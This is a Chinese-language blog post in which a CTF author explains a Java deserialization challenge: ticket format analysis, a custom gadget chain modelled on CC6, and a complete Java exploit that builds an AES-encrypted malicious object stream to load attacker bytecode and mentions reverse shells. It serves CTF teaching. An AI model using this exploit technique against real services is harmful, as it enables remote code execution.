---
title: 记一次CTF出题经历
date: 2026-07-24 14:36:26
updated: 2026-07-24 14:36:26
tags:
  - Web
  - java
  - 反序列化
  - 代码审计
  - CTF
---
# babygadget

## 0.前言

实习期间接到+1安排的CTF Web方向出题任务。回想上一次出题还是为工作室招新，当时没有能力出一道涉及Java反序列化的题目。借着这次机会，决定出一道Java反序列化题。本题改编自跟着白日梦组长学习CC链过程中接触到的一道题目。

## 1.信息收集

访问首页可以看到这是一个旧 OA 票据兼容网关，前端会把输入框中的票据作为 Bearer Token 发送到：

```http
POST /api/legacy-sso/ticket/verify
Authorization: Bearer <ticket>
```

审计后端入口 `Login.java`，核心处理流程如下：

![image.png](https://cdn.nlark.com/yuque/0/2026/png/39170111/1786693116867-78421e9a-5155-4fe2-afcb-93b6b96dba07.png?x-oss-process=image%2Fformat%2Cwebp)

可以确定票据格式为：

```text
URL-encoded(
  Base64(
    AES-CBC-PKCS5Padding(
      Java Object Stream: long + UTF + Object
    )
  )
)
```

AES 参数在 `Crypto.java` 中：

![image.png](https://cdn.nlark.com/yuque/0/2026/png/39170111/1786693163661-181e21f3-2e0d-42df-85ea-e6ffe12f4961.png?x-oss-process=image%2Fformat%2Cwebp)

通过前两个字段校验后，服务端会调用 `readObject()` 反序列化后续对象。

## 2.Gadget 分析

继续审计 `HashCode.java`：

![image-20260814155259280.png](https://cdn.nlark.com/yuque/0/2026/png/39170111/1786694558824-415236a8-a11c-4093-a031-e6910c5aecea.png?x-oss-process=image%2Fformat%2Cwebp)

参考CC6链前段，在此题中，如果把 `HashCode` 对象作为 `HashMap` 的 key，反序列化 `HashMap` 时会重新计算 key 的 hash，最终加载恶意类：

```text
ObjectInputStream.readObject()
  -> HashMap.readObject()
    -> hash(key)
      -> key.hashCode()
        -> defineClass(ClassByte)
        -> newInstance()
```

## 3.构造Payload

### 3.1准备字节码类

构造一个无包名、带无参构造或静态初始化逻辑的 class。可以exec命令执行反弹shell也可以通过工具生成能回显执行结果的类字节码。

![image-20260814154021791](/Users/bigcolaxd/Library/Application Support/typora-user-images/image-20260814154021791.png)

编译并读取 `Payload.class` 的字节内容：

```bash
javac Payload.java
```

### 3.2构造 Java 对象流

对象流必须严格按照服务端读取顺序写入：

```text
writeLong(0x7EE5BDA9E89B8B7EL)
writeUTF("admin")
writeObject(hashMap)
```

其中 `hashMap` 的 key 是写入了 `ClassByte` 的 `HashCode` 实例。

exp：

```java
public class exp {
    public static void main(String[] args) throws Exception{

        String AES_KEY = "TAKETHEAESKEY123"; // 16字节
        String AES_IV = "2026071620260716";  // 16字节

        HashCode hashCode = new HashCode();
        Field field = hashCode.getClass().getDeclaredField("ClassByte");
        field.setAccessible(true);
        byte[] bytes = Files.readAllBytes(Paths.get("evil.class"));
        field.set(hashCode,bytes);

        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(hashCode,"test");


        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeLong(0x7EE5BDA9E89B8B7EL);

        objectOutputStream.writeUTF("admin");
        objectOutputStream.writeObject(hashMap);

        byte[] bytes1 = byteArrayOutputStream.toByteArray();
        byte[] encryptedData = aesEncrypt(bytes1,AES_KEY,AES_IV);
        String s = Base64.getEncoder().encodeToString(encryptedData);
        System.out.println(s);
        System.out.println(URLEncoder.encode(s));
    }
    public static byte[] aesEncrypt(byte[] data, String key, String iv) throws Exception {
        SecretKeySpec keySpec = new SecretKeySpec(key.getBytes(), "AES");
        IvParameterSpec ivSpec = new IvParameterSpec(iv.getBytes());

        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec);

        return cipher.doFinal(data);
    }
}
```

`HashMap#put()` 本身也会调用一次 key 的 `hashCode()`，因此生成 Payload 时可能会在本地触发一次字节码。可以通过反射手工构造 `HashMap` 内部 table 来避免本地触发。

## 4.发送请求

![image.png](https://cdn.nlark.com/yuque/0/2026/png/39170111/1786693330125-4432bc39-e1bf-48e1-9c8b-7da79cd60ca7.png?x-oss-process=image%2Fformat%2Cwebp)